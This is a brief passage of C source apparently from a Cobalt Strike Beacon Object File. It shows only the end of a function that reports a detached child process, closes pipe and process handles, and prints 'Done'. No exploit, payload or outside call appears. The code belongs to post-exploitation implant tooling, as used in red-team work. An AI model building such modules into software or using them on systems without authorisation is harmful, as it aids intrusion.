        BeaconPrintf(CALLBACK_OUTPUT, "[+] No-output mode, child running detached");
    }

    /* Cleanup */
    if (sctx.hPipeOutRead) { KERNEL32$CloseHandle(sctx.hPipeOutRead); sctx.hPipeOutRead = NULL; }
    if (sctx.hPipeInWrite) { KERNEL32$CloseHandle(sctx.hPipeInWrite); sctx.hPipeInWrite = NULL; }
    if (sctx.pi.hProcess)  { KERNEL32$CloseHandle(sctx.pi.hProcess);  sctx.pi.hProcess = NULL; }
    if (sctx.pi.hThread)   { KERNEL32$CloseHandle(sctx.pi.hThread);   sctx.pi.hThread = NULL; }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}
